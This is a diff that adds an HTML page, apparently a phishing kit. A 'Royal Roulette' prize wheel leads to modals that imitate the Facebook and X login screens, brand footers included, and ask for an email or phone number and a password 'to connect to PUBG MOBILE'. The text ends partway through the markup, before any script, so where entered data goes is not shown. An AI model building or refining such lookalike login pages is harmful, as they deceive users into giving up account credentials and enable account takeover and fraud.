@@ -1,0 +1,1858 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Royal Roulette</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background: #000;
+            color: white;
+            min-height: 100vh;
+            position: relative;
+            overflow-x: hidden;
+            overflow-y: auto;
+        }
+
+        .backgrounds-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -2;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .background-top {
+            flex: 1;
+            background-image: url('phon.png');
+            background-size: cover;
+            background-position: center;
+            min-height: 50vh;
+            position: relative;
+        }
+
+        .background-bottom {
+            flex: 1;
+            background-image: url('phon2.png');
+            background-size: cover;
+            background-position: center;
+            min-height: 50vh;
+            position: relative;
+        }
+
+        .gradient-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(to bottom, 
+                transparent 0%, 
+                rgba(0, 0, 0, 0.3) 30%, 
+                rgba(0, 0, 0, 0.7) 70%, 
+                transparent 100%);
+            z-index: 1;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 100%;
+            margin: 0;
+            padding: 40px 20px;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            z-index: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-end;
+            height: auto;
+            transition: all 0.5s ease;
+        }
+
+        .roulette-container {
+            position: relative;
+            width: 350px;
+            height: 350px;
+            margin: 0 auto 25px;
+            pointer-events: none;
+            user-select: none;
+            -webkit-user-drag: none;
+        }
+
+        .wheel-container {
+            position: relative;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .wheel {
+            position: absolute;
+            transition: transform 3s cubic-bezier(0.17, 0.67, 0.83, 0.67);
+            transform-origin: center;
+        }
+
+        .prize-wheel {
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+        }
+
+        .wheel-base {
+            width: 55%;
+            height: 55%;
+            z-index: 2;
+            filter: brightness(1.2);
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            object-fit: contain;
+            pointer-events: none;
+        }
+
+        .spin-button {
+            display: block;
+            margin: 25px auto;
+            padding: 15px 50px;
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: black;
+            background: linear-gradient(45deg, gold, #ffd700);
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            box-shadow: 0 0 20px rgba(255, 215, 0, 0.7);
+            position: relative;
+            overflow: hidden;
+            z-index: 3;
+            pointer-events: auto;
+            animation: pulse 2s infinite;
+        }
+
+        .spin-button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 30px rgba(255, 215, 0, 1);
+            background: linear-gradient(45deg, #ffd700, gold);
+            animation: none;
+        }
+
+        .spin-button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+            animation: none;
+        }
+
+        .spin-button::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+            transform: rotate(45deg);
+            transition: all 0.5s;
+        }
+
+        .spin-button:hover::before {
+            left: 100%;
+        }
+
+        /* Модальные окна */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            animation: fadeIn 0.3s ease;
+            overflow-y: auto;
+            padding: 20px;
+        }
+
+        .modal-content {
+            background: #000;
+            border-radius: 16px;
+            padding: 0;
+            width: 100%;
+            max-width: 400px;
+            min-height: 600px;
+            position: relative;
+            overflow: hidden;
+            border: 1px solid #2f3336;
+            box-shadow: 0 0 30px rgba(0, 0, 0, 0.8);
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Стили для окна выигрыша */
+        .win-modal-header {
+            background: linear-gradient(135deg, #1a1a1a 0%, #333 100%);
+            padding: 25px 20px;
+            border-bottom: 2px solid gold;
+        }
+
+        .prize-image-container {
+            width: 100%;
+            padding: 30px;
+            background: #111;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .prize-image {
+            max-width: 200px;
+            max-height: 200px;
+            width: auto;
+            height: auto;
+            border: none;
+            border-radius: 0;
+            box-shadow: none;
+        }
+
+        .login-options {
+            padding: 25px 20px;
+            background: #222;
+        }
+
+        .login-options h3 {
+            color: #fff;
+            margin-bottom: 25px;
+            font-size: 1.4rem;
+        }
+
+        .checkbox-option {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 15px;
+            background: #333;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            cursor: pointer;
+            transition: all 0.3s;
+            border: 2px solid transparent;
+        }
+
+        .checkbox-option:hover {
+            background: #444;
+            border-color: #555;
+        }
+
+        .checkbox-option.active {
+            background: #444;
+            border-color: gold;
+        }
+
+        .checkbox-option-content {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            width: 100%;
+        }
+
+        .social-icon {
+            width: 30px;
+            height: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.3rem;
+            font-weight: bold;
+            border-radius: 5px;
+        }
+
+        .facebook-icon {
+            background: #1877f2;
+            color: white;
+        }
+
+        .twitter-icon {
+            background: #000;
+            color: white;
+            border: 2px solid #fff;
+        }
+
+        .checkbox-option span {
+            color: #fff;
+            font-size: 1.1rem;
+            font-weight: bold;
+        }
+
+        .checkbox-icon {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            border: 2px solid #666;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s;
+        }
+
+        .checkbox-option.active .checkbox-icon {
+            background: gold;
+            border-color: gold;
+        }
+
+        .checkbox-option.active .checkbox-icon::after {
+            content: '✓';
+            color: #000;
+            font-weight: bold;
+        }
+
+        .modal-buttons {
+            padding: 20px;
+            background: #111;
+            display: flex;
+            gap: 15px;
+            border-top: 1px solid #333;
+        }
+
+        .modal-button {
+            flex: 1;
+            padding: 15px;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .modal-button.cancel {
+            background: #333;
+            color: #ccc;
+        }
+
+        .modal-button.ok {
+            background: gold;
+            color: #000;
+        }
+
+        .modal-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+
+        /* Стили для Facebook окна */
+        .facebook-modal-content {
+            background: #f0f2f5;
+            color: #000;
+            min-height: 600px;
+        }
+
+        .facebook-header {
+            background: #fff;
+            padding: 20px;
+            text-align: center;
+            border-bottom: 1px solid #ddd;
+        }
+
+        .facebook-logo {
+            color: #1877f2;
+            font-size: 3rem;
+            font-weight: bold;
+            margin-bottom: 10px;
+            letter-spacing: -1px;
+        }
+
+        .facebook-subtitle {
+            color: #1c1e21;
+            font-size: 1rem;
+            max-width: 300px;
+            margin: 0 auto;
+            line-height: 1.4;
+            font-weight: normal;
+        }
+
+        .facebook-form {
+            padding: 20px;
+            background: #fff;
+            margin: 15px;
+            border-radius: 8px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+        }
+
+        .facebook-input {
+            width: 100%;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 1rem;
+            background: #fff;
+            color: #1c1e21;
+        }
+
+        .facebook-input::placeholder {
+            color: #8a8d91;
+        }
+
+        .facebook-input:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+        }
+
+        .facebook-login-button {
+            width: 100%;
+            padding: 14px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 15px;
+            transition: background-color 0.3s;
+        }
+
+        .facebook-login-button:hover {
+            background: #166fe5;
+        }
+
+        .facebook-divider {
+            text-align: center;
+            margin: 20px 0;
+            color: #8a8d91;
+            position: relative;
+            font-size: 0.9rem;
+        }
+
+        .facebook-divider::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: #dddfe2;
+        }
+
+        .facebook-divider span {
+            background: #fff;
+            padding: 0 15px;
+            position: relative;
+        }
+
+        .facebook-create-button {
+            width: 70%;
+            padding: 12px;
+            background: #42b72a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 0 auto 15px;
+            display: block;
+            transition: background-color 0.3s;
+        }
+
+        .facebook-create-button:hover {
+            background: #36a420;
+        }
+
+        .facebook-links {
+            text-align: center;
+            margin-top: 20px;
+            padding-top: 15px;
+            border-top: 1px solid #dddfe2;
+        }
+
+        .facebook-links a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 0.85rem;
+            display: block;
+            margin-bottom: 8px;
+        }
+
+        .facebook-links a:hover {
+            text-decoration: underline;
+        }
+
+        .facebook-language {
+            background: #fff;
+            padding: 15px 20px;
+            margin-top: 15px;
+            border-top: 1px solid #dddfe2;
+        }
+
+        .facebook-language select {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #dddfe2;
+            border-radius: 4px;
+            background: white;
+            color: #1c1e21;
+            font-size: 0.85rem;
+        }
+
+        .facebook-footer {
+            background: #fff;
+            padding: 15px 20px;
+            font-size: 0.75rem;
+            color: #8a8d91;
+            text-align: center;
+            border-top: 1px solid #dddfe2;
+        }
+
+        /* АКТУАЛЬНЫЕ стили для Twitter (X) окна 2025 */
+        .twitter-modal-content {
+            background: #000;
+            color: #fff;
+            max-width: 400px;
+            width: 100%;
+            height: 90vh;
+            max-height: 800px;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+
+        .twitter-header {
+            padding: 0;
+            position: relative;
+        }
+
+        .twitter-close-button {
+            position: absolute;
+            top: 16px;
+            left: 16px;
+            background: rgba(255, 255, 255, 0.1);
+            border: none;
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            z-index: 10;
+            transition: background-color 0.2s;
+        }
+
+        .twitter-close-button:hover {
+            background: rgba(255, 255, 255, 0.2);
+        }
+
+        .twitter-close-icon {
+            color: #fff;
+            font-size: 20px;
+            font-weight: 300;
+        }
+
+        .twitter-logo-container {
+            padding: 40px 20px 20px;
+            text-align: center;
+            border-bottom: 1px solid #2f3336;
+        }
+
+        .twitter-logo {
+            color: #fff;
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 24px;
+            display: inline-block;
+        }
+
+        .twitter-title-container {
+            padding: 24px 20px 16px;
+        }
+
+        .twitter-title {
+            font-size: 23px;
+            font-weight: 700;
+            color: #e7e9ea;
+            margin-bottom: 8px;
+            line-height: 1.3;
+        }
+
+        .twitter-subtitle {
+            color: #71767b;
+            font-size: 15px;
+            line-height: 1.4;
+        }
+
+        .twitter-form {
+            padding: 0 20px;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .twitter-input-group {
+            margin-bottom: 16px;
+            position: relative;
+        }
+
+        .twitter-input {
+            width: 100%;
+            padding: 16px 8px;
+            background: transparent;
+            border: 1px solid #2f3336;
+            border-radius: 4px;
+            color: #e7e9ea;
+            font-size: 17px;
+            transition: border-color 0.2s;
+            outline: none;
+        }
+
+        .twitter-input:focus {
+            border-color: #1d9bf0;
+            border-width: 2px;
+        }
+
+        .twitter-input::placeholder {
+            color: #71767b;
+            font-size: 17px;
+        }
+
+        .twitter-next-button {
+            width: 100%;
+            padding: 14px 0;
+            background: #fff;
+            color: #0f1419;
+            border: none;
+            border-radius: 50px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: background-color 0.2s;
+        }
+
+        .twitter-next-button:hover {
+            background: #e6e6e6;
+        }
+
+        .twitter-next-button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .twitter-forgot-link {
+            color: #1d9bf0;
+            text-decoration: none;
+            font-size: 14px;
+            margin-top: 12px;
+            display: inline-block;
+            transition: text-decoration 0.2s;
+        }
+
+        .twitter-forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .twitter-divider {
+            display: flex;
+            align-items: center;
+            margin: 24px 0;
+            color: #71767b;
+            font-size: 15px;
+        }
+
+        .twitter-divider::before,
+        .twitter-divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #2f3336;
+        }
+
+        .twitter-divider span {
+            padding: 0 15px;
+        }
+
+        .twitter-alt-button {
+            width: 100%;
+            padding: 14px 0;
+            background: transparent;
+            border: 1px solid #2f3336;
+            border-radius: 50px;
+            color: #fff;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: background-color 0.2s;
+        }
+
+        .twitter-alt-button:hover {
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        .twitter-alt-button.google {
+            position: relative;
+        }
+
+        .twitter-alt-button.google::before {
+            content: '';
+            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="%23000" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="%2334A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="%23FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="%23EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>') no-repeat center;
+            background-size: contain;
+            width: 18px;
+            height: 18px;
+            display: inline-block;
+        }
+
+        .twitter-alt-button.apple::before {
+            content: '';
+            font-size: 18px;
+        }
+
+        .twitter-signup {
+            margin-top: auto;
+            padding: 16px 20px 40px;
+            text-align: center;
+            color: #71767b;
+            font-size: 15px;
+            border-top: 1px solid #2f3336;
+        }
+
+        .twitter-signup-link {
+            color: #1d9bf0;
+            text-decoration: none;
+            font-weight: 700;
+            transition: text-decoration 0.2s;
+        }
+
+        .twitter-signup-link:hover {
+            text-decoration: underline;
+        }
+
+        .twitter-footer {
+            padding: 12px 20px;
+            color: #71767b;
+            font-size: 13px;
+            text-align: center;
+            border-top: 1px solid #2f3336;
+            margin-top: auto;
+        }
+
+        /* Окно восстановления пароля */
+        .forgot-password-modal {
+            background: #000;
+            color: #fff;
+            max-width: 400px;
+            width: 100%;
+            border-radius: 16px;
+            overflow: hidden;
+            height: 90vh;
+            max-height: 800px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .forgot-password-header {
+            padding: 0;
+            position: relative;
+            min-height: 53px;
+        }
+
+        .back-button {
+            position: absolute;
+            top: 16px;
+            left: 16px;
+            background: rgba(255, 255, 255, 0.1);
+            border: none;
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            z-index: 10;
+            transition: background-color 0.2s;
+        }
+
+        .back-button:hover {
+            background: rgba(255, 255, 255, 0.2);
+        }
+
+        .back-icon {
+            color: #fff;
+            font-size: 20px;
+            font-weight: 300;
+        }
+
+        .forgot-password-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #e7e9ea;
+            padding: 16px 60px;
+            text-align: center;
+            border-bottom: 1px solid #2f3336;
+        }
+
+        .forgot-password-content {
+            padding: 20px;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .forgot-password-text {
+            color: #e7e9ea;
+            margin-bottom: 20px;
+            font-size: 15px;
+            line-height: 1.4;
+        }
+
+        .email-input {
+            width: 100%;
+            padding: 16px 8px;
+            background: transparent;
+            border: 1px solid #2f3336;
+            border-radius: 4px;
+            color: #e7e9ea;
+            font-size: 17px;
+            margin-bottom: 20px;
+        }
+
+        .email-input:focus {
+            outline: none;
+            border-color: #1d9bf0;
+            border-width: 2px;
+        }
+
+        .email-input::placeholder {
+            color: #71767b;
+            font-size: 17px;
+        }
+
+        .search-button {
+            width: 100%;
+            padding: 14px 0;
+            background: #fff;
+            color: #0f1419;
+            border: none;
+            border-radius: 50px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin-top: auto;
+        }
+
+        .search-button:hover {
+            background: #e6e6e6;
+        }
+
+        /* Окно регистрации */
+        .signup-modal {
+            background: #000;
+            color: #fff;
+            max-width: 400px;
+            width: 100%;
+            border-radius: 16px;
+            overflow: hidden;
+            height: 90vh;
+            max-height: 800px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .signup-header {
+            padding: 0;
+        }
+
+        .signup-close-button {
+            position: absolute;
+            top: 16px;
+            left: 16px;
+            background: rgba(255, 255, 255, 0.1);
+            border: none;
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            z-index: 10;
+            transition: background-color 0.2s;
+        }
+
+        .signup-close-button:hover {
+            background: rgba(255, 255, 255, 0.2);
+        }
+
+        .signup-close-icon {
+            color: #fff;
+            font-size: 20px;
+            font-weight: 300;
+        }
+
+        .signup-logo-container {
+            padding: 40px 20px 20px;
+            text-align: center;
+            border-bottom: 1px solid #2f3336;
+        }
+
+        .signup-logo {
+            color: #fff;
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 24px;
+            display: inline-block;
+        }
+
+        .signup-title {
+            font-size: 23px;
+            font-weight: 700;
+            color: #e7e9ea;
+            margin-bottom: 8px;
+        }
+
+        .signup-subtitle {
+            color: #71767b;
+            font-size: 15px;
+            line-height: 1.4;
+        }
+
+        .signup-content {
+            padding: 20px;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .signup-alt-button {
+            width: 100%;
+            padding: 14px 0;
+            background: transparent;
+            border: 1px solid #2f3336;
+            border-radius: 50px;
+            color: #fff;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: background-color 0.2s;
+        }
+
+        .signup-alt-button:hover {
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        .signup-alt-button.google::before {
+            content: '';
+            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="%23000" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="%2334A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="%23FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="%23EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>') no-repeat center;
+            background-size: contain;
+            width: 18px;
+            height: 18px;
+            display: inline-block;
+        }
+
+        .signup-alt-button.apple::before {
+            content: '';
+            font-size: 18px;
+        }
+
+        .signup-divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #71767b;
+            font-size: 15px;
+        }
+
+        .signup-divider::before,
+        .signup-divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #2f3336;
+        }
+
+        .signup-divider span {
+            padding: 0 15px;
+        }
+
+        .create-account-button {
+            width: 100%;
+            padding: 14px 0;
+            background: #fff;
+            color: #0f1419;
+            border: none;
+            border-radius: 50px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-bottom: 15px;
+            transition: background-color 0.2s;
+        }
+
+        .create-account-button:hover {
+            background: #e6e6e6;
+        }
+
+        .signup-terms {
+            color: #71767b;
+            font-size: 11px;
+            line-height: 1.4;
+            margin-bottom: 30px;
+            text-align: center;
+        }
+
+        .signup-terms a {
+            color: #1d9bf0;
+            text-decoration: none;
+        }
+
+        .signup-terms a:hover {
+            text-decoration: underline;
+        }
+
+        .login-link {
+            color: #71767b;
+            font-size: 15px;
+            text-align: center;
+            margin-top: auto;
+        }
+
+        .login-link a {
+            color: #1d9bf0;
+            text-decoration: none;
+            font-weight: 700;
+        }
+
+        .login-link a:hover {
+            text-decoration: underline;
+        }
+
+        /* Стили для окна успеха */
+        .success-modal-content {
+            background: #000;
+            border: 3px solid gold;
+            min-height: 500px;
+        }
+
+        .success-header {
+            background: linear-gradient(135deg, #1a1a1a 0%, #333 100%);
+            padding: 25px 20px;
+            border-bottom: 2px solid gold;
+        }
+
+        .success-prize-container {
+            padding: 30px;
+            background: #111;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .success-prize-image {
+            max-width: 150px;
+            max-height: 150px;
+            width: auto;
+            height: auto;
+            border: none;
+            border-radius: 0;
+            box-shadow: none;
+        }
+
+        .success-message {
+            padding: 25px 20px;
+            background: #222;
+            text-align: center;
+        }
+
+        .success-message h3 {
+            color: gold;
+            font-size: 1.8rem;
+            margin-bottom: 10px;
+        }
+
+        .success-message p {
+            color: #ccc;
+            font-size: 1.1rem;
+        }
+
+        /* Анимации */
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes wheelGlow {
+            0% { filter: drop-shadow(0 0 5px gold); }
+            50% { filter: drop-shadow(0 0 20px gold); }
+            100% { filter: drop-shadow(0 0 5px gold); }
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+                box-shadow: 0 0 20px rgba(255, 215, 0, 0.7);
+            }
+            50% {
+                transform: scale(1.05);
+                box-shadow: 0 0 30px rgba(255, 215, 0, 0.9);
+            }
+            100% {
+                transform: scale(1);
+                box-shadow: 0 0 20px rgba(255, 215, 0, 0.7);
+            }
+        }
+
+        .spinning {
+            animation: wheelGlow 1s infinite;
+        }
+
+        /* Исправление прокрутки */
+        .modal-content::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        .modal-content::-webkit-scrollbar-track {
+            background: transparent;
+        }
+
+        .modal-content::-webkit-scrollbar-thumb {
+            background: #2f3336;
+            border-radius: 3px;
+        }
+
+        @media (max-width: 768px) {
+            .roulette-container {
+                width: 300px;
+                height: 300px;
+            }
+            
+            .wheel-base {
+                width: 55%;
+                height: 55%;
+            }
+            
+            .spin-button {
+                padding: 12px 40px;
+                font-size: 1.3rem;
+                margin: 20px auto;
+            }
+
+            .modal-content {
+                max-width: 95%;
+                min-height: auto;
+            }
+
+            .facebook-modal-content {
+                min-height: 550px;
+            }
+
+            .twitter-modal-content,
+            .forgot-password-modal,
+            .signup-modal {
+                max-width: 95%;
+                height: 95vh;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 30px 20px;
+            }
+            
+            .roulette-container {
+                width: 280px;
+                height: 280px;
+                margin-bottom: 20px;
+            }
+            
+            .wheel-base {
+                width: 55%;
+                height: 55%;
+            }
+            
+            .spin-button {
+                padding: 10px 30px;
+                font-size: 1.2rem;
+                margin: 15px auto;
+            }
+
+            .prize-image {
+                max-width: 150px;
+                max-height: 150px;
+            }
+
+            .facebook-logo {
+                font-size: 2.5rem;
+            }
+
+            .facebook-subtitle {
+                font-size: 0.9rem;
+            }
+
+            .twitter-title {
+                font-size: 20px;
+            }
+
+            .twitter-subtitle {
+                font-size: 14px;
+            }
+        }
+
+        /* Мобильная оптимизация */
+        @media (max-height: 700px) {
+            .twitter-modal-content,
+            .forgot-password-modal,
+            .signup-modal {
+                height: 100vh;
+                max-height: none;
+                border-radius: 0;
+            }
+            
+            .twitter-logo-container {
+                padding-top: 30px;
+            }
+            
+            .twitter-title-container {
+                padding-top: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="backgrounds-container">
+        <div class="background-top"></div>
+        <div class="background-bottom"></div>
+        <div class="gradient-overlay"></div>
+    </div>
+
+    <div class="container">
+        <div class="roulette-container">
+            <div class="wheel-container">
+                <img src="wheel.png" alt="Колесо рулетки" class="wheel prize-wheel" id="prizeWheel">
+                <img src="wheel_base.png" alt="Основание колеса" class="wheel wheel-base" id="wheelBase">
+            </div>
+        </div>
+
+        <button class="spin-button" id="spinButton">КРУТИТЬ РУЛЕТКУ</button>
+    </div>
+
+    <!-- Модальное окно выигрыша -->
+    <div class="modal-overlay" id="winModal">
+        <div class="modal-content">
+            <div class="win-modal-header">
+                <!-- Текст удален как указано -->
+            </div>
+            
+            <div class="prize-image-container">
+                <img id="winPrizeImage" class="prize-image" alt="Выигрыш">
+            </div>
+            
+            <div class="login-options">
+                <h3>Login With:</h3>
+                <div class="checkbox-option" id="facebookOption">
+                    <div class="checkbox-option-content">
+                        <div class="social-icon facebook-icon">f</div>
+                        <span>Login With Facebook</span>
+                    </div>
+                    <div class="checkbox-icon"></div>
+                </div>
+                <div class="checkbox-option" id="twitterOption">
+                    <div class="checkbox-option-content">
+                        <div class="social-icon twitter-icon">𝕏</div>
+                        <span>Login With X (Twitter)</span>
+                    </div>
+                    <div class="checkbox-icon"></div>
+                </div>
+            </div>
+            
+            <div class="modal-buttons">
+                <button class="modal-button cancel" id="cancelWin">Cancel</button>
+                <button class="modal-button ok" id="confirmLogin">OK</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Модальное окно входа в Facebook -->
+    <div class="modal-overlay" id="facebookModal">
+        <div class="modal-content facebook-modal-content">
+            <div class="facebook-header">
+                <div class="facebook-logo">facebook</div>
+                <div class="facebook-subtitle">Log in to your Facebook account to connect to PUBG MOBILE</div>
+            </div>
+            
+            <form class="facebook-form" id="facebookForm">
+                <input type="text" class="facebook-input" id="fbEmail" placeholder="Mobile number or email address" required>
+                <input type="password" class="facebook-input" id="fbPassword" placeholder="Password" required>
+                
+                <button type="submit" class="facebook-login-button">Log In</button>
+                
+                <div class="facebook-divider">
+                    <span>or</span>
+                </div>
+                
+                <button type="button" class="facebook-create-button" id="createAccount">Create new account</button>
+                
+                <div class="facebook-links">
+                    <a href="#" id="fbNotNow">Not now</a>
+                    <a href="#" id="forgotPassword">Forgotten password?</a>
+                </div>
+            </form>
+            
+            <div class="facebook-language">
+                <select>
+                    <option>English (UK)</option>
+                    <option>Basa Jawa</option>
+                    <option>日本語</option>
+                    <option>Português (Brasil)</option>
+                    <option>Bahasa Indonesia</option>
+                    <option>Bahasa Melayu</option>
+                    <option>Español</option>
+                    <option>Русский</option>
+                </select>
+            </div>
+            
+            <div class="facebook-footer">
+                Meta Platforms, Inc.
+            </div>
+        </div>
+    </div>
+
+    <!-- АКТУАЛЬНОЕ модальное окно входа в X (Twitter) 2025 -->
+    <div class="modal-overlay" id="twitterModal">
+        <div class="modal-content twitter-modal-content">
+            <div class="twitter-header">
+                <button class="twitter-close-button" id="twitterCloseButton">
+                    <span class="twitter-close-icon">×</span>
+                </button>
+            </div>
+            
+            <div class="twitter-logo-container">
+                <div class="twitter-logo">𝕏</div>
+            </div>
+            
+            <div class="twitter-title-container">
+                <h1 class="twitter-title">Sign in to X</h1>
+                <p class="twitter-subtitle">Log in to your X account to connect to PUBG MOBILE</p>
+            </div>
+            
+            <form class="twitter-form" id="twitterForm">
+                <div class="twitter-input-group">
+                    <input type="text" class="twitter-input" id="twitterEmail" placeholder="Phone number or email address" required>
+                </div>
+                
+                <div class="twitter-input-group">
+                    <input type="password" class="twitter-input" id="twitterPassword" placeholder="Password" required>
+                </div>
+                
+                <button type="submit" class="twitter-next-button" id="twitterNextButton">Next</button>
+                
+                <a href="#" class="twitter-forgot-link" id="twitterForgot">Forgot password?</a>
+                
+                <div class="twitter-divider">
+                    <span>or</span>
+                </div>
+                
+                <button type="button" class="twitter-alt-button google" id="twitterGoogle">
+                    <span>Sign in with Google</span>
+                </button>
+                
+                <button type="button" class="twitter-alt-button apple" id="twitterApple">
+                    <span>Sign in with Apple</span>
+                </button>
+                
+                <div class="twitter-signup">
+                    Don't have an account? <a href="#" class="twitter-signup-link" id="twitterSignup">Sign up</a>
+                </div>
+            </form>
+            
+            <div class="twitter-footer">
+                © 2025 X Corp.
+            </div>
+        </div>
+    </div>
+
+    <!-- Модальное окно восстановления пароля X -->
+    <div class="modal-overlay" id="twitterForgotModal">
+        <div class="forgot-password-modal">
